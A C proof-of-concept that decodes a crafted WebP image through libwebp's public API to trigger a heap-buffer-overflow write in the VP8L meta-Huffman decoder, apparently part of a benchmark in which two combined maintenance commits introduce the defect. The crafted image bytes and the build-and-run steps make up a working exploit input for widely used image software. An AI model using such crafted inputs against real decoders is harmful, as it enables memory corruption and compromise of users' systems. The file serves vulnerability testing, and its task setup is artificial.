// Proof-of-concept for a delocalized heap-buffer-overflow (CWE-787) in the
// libwebp lossless (VP8L) meta-Huffman decoder.
//
// The input below is a tiny, in-contract crafted WebP image (a 1x1 lossless
// image whose meta-Huffman entropy image uses a single, *sparse* group value).
// It is decoded through the public API WebPDecodeRGBA().
//
//   * On the batch base and on the unedited maintenance batch it decodes
//     cleanly (returns a valid 1x1 RGBA buffer).
//   * On the resulting tree it triggers an out-of-bounds write of an
//     HTreeGroup entry in ReadHuffmanCodesHelper() and AddressSanitizer aborts.
//
// Build (resulting tree), e.g.:
//   cc -I<libwebp>/src -fsanitize=address -g probe.c libwebp.a -lm -o probe
//   ./probe        # ASan: heap-buffer-overflow WRITE -> SIGABRT
//
// The defect only exists when TWO maintenance commits combine; see
// selection.json for the coupling. The decode path and input are entirely
// public-API and in-contract.

#include <stdio.h>

#include "webp/decode.h"

// Crafted WebP bytes (RIFF/WEBP/VP8L container), generated offline.
static const unsigned char kWebP[] = {
    82, 73, 70, 70, 44, 0,  0,  0,  87, 69, 66, 80, 86, 80, 56, 76, 31, 0,
    0,  0,  47, 0,  0,  0,  0,  132, 6, 68, 68, 68, 68, 68, 68, 68, 0,  0,
    0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0};
static const unsigned int kWebPLen = 52;

int main(void) {
  int width = 0, height = 0;
  uint8_t* rgba = WebPDecodeRGBA(kWebP, (size_t)kWebPLen, &width, &height);
  // On the resulting tree, ASan aborts inside WebPDecodeRGBA above and we never
  // get here. On a fixed/clean tree, the decode returns and we free normally.
  if (rgba != NULL) {
    printf("decoded %dx%d (no defect reachable)\n", width, height);
    WebPFree(rgba);
  } else {
    printf("decode returned error (no defect reachable)\n");
  }
  return 0;
}
